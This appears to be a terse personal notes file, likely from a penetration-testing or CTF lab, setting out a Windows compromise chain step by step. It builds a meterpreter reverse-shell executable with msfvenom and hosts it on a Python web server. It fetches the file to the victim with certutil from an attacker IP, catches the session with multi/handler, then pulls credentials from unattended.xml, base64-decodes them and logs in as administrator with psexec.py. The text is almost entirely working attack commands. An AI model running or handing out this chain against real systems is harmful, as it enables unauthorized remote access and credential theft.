get meterpter session 

msfvenom to create payload 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe


python -m simplehttp server (to upload our payload)
python3 -m http.server 80

in victim host : 
- open cmd 
- certutil -urlcache  -f http://attacker-ip/shell.exe shell.exe

go back to attacker to start multi/handler 
set same playload 

in meterpter 
search -f unattended.xml
download untend.xml
look for user credentional


nano password.txt
base64 -d password.txt 

psexec.py adminstrator@target_ip 


